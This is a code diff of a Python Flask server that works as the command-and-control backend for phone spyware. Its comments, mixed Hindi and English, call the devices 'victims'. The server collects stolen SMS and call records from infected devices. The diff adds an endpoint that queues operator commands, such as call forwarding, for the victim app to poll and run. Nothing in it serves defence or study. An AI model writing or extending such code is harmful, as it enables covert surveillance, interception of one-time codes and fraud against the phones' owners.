@@ -3,17 +3,18 @@ from flask_cors import CORS
 import json
 
 app = Flask(__name__)
-CORS(app)  # Sabhi devices ko connect karne ki permission
+CORS(app)
 
 # ==========================================
-# DATA STORE (Abhi ke liye memory mein save hoga)
+# DATA STORE
 # ==========================================
 devices = {}        # device_id -> device info
 sms_store = {}      # device_id -> list of sms
 call_store = {}     # device_id -> list of calls
+command_queue = {}  # device_id -> {"command": "CALL_FWD", "data": "number"}
 
 # ==========================================
-# 1. REGISTER API (Victim app se pehla data aayega)
+# 1. REGISTER API
 # ==========================================
 @app.route('/api/register', methods=['POST'])
 def register():
@@ -30,7 +31,7 @@ def register():
     return jsonify({"status": "success", "device_id": device_id}), 200
 
 # ==========================================
-# 2. SMS RECEIVE API (Victim app se SMS aayegi)
+# 2. SMS RECEIVE API
 # ==========================================
 @app.route('/api/sms', methods=['POST'])
 def receive_sms():
@@ -45,7 +46,7 @@ def receive_sms():
     return jsonify({"error": "Device not found"}), 404
 
 # ==========================================
-# 3. CALL RECEIVE API (Victim app se call data aayega)
+# 3. CALL RECEIVE API
 # ==========================================
 @app.route('/api/call', methods=['POST'])
 def receive_call():
@@ -60,7 +61,7 @@ def receive_call():
     return jsonify({"error": "Device not found"}), 404
 
 # ==========================================
-# 4. DEVICES LIST API (Dashboard ke liye)
+# 4. DEVICES LIST API (Dashboard)
 # ==========================================
 @app.route('/api/devices', methods=['GET'])
 def get_devices():
@@ -76,18 +77,48 @@ def get_devices():
     return jsonify({"devices": device_list}), 200
 
 # ==========================================
-# 5. COMMAND FETCH API (Victim app har 15 sec mein yeh call karegi)
+# 5. SET COMMAND API (Dashboard se command set karega)
+# ==========================================
+@app.route('/api/set_command', methods=['POST'])
+def set_command():
+    data = request.get_json()
+    device_id = data.get('device_id')
+    command = data.get('command')
+    command_data = data.get('data')
+    
+    if not device_id or not command:
+        return jsonify({"error": "device_id and command required"}), 400
+    
+    # Command store karo
+    command_queue[device_id] = {
+        "command": command,
+        "data": command_data
+    }
+    print(f"[+] Command set for {device_id}: {command} -> {command_data}")
+    return jsonify({"status": "command set"}), 200
+
+# ==========================================
+# 6. COMMAND FETCH API (Victim app ise poll karegi)
 # ==========================================
 @app.route('/api/commands/<device_id>', methods=['GET'])
 def get_commands(device_id):
-    # Abhi ke liye empty command return kar rahe hain
-    return jsonify({
-        "command": "",
-        "data": ""
-    }), 200
+    # Check if command exists for this device
+    if device_id in command_queue:
+        cmd = command_queue[device_id]
+        # Command dekar queue se hata do (taaki baar baar execute na ho)
+        del command_queue[device_id]
+        return jsonify({
+            "command": cmd["command"],
+            "data": cmd["data"]
+        }), 200
+    else:
+        return jsonify({
+            "command": "",
+            "data": ""
+        }), 200
 
 # ==========================================
-# 6. RUN SERVER
+# 7. RUN SERVER
 # ==========================================
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
